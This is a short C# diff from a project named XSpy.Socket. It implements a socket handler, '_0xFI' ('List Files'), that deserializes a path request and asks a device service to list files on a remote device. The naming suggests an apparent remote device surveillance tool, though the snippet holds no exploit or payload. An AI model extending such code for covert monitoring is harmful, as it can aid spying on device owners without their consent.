@@ -65,8 +65,10 @@ namespace XSpy.Socket
         }
 
         //List Files
-        public async Task _0xFI()
+        public async Task _0xFI(string request)
         {
+            var pathRequest = JsonConvert.DeserializeObject<List<LoadPathData>>(request);
+            await _deviceService.ListPath(GetDeviceId(), pathRequest);
         }
 
 
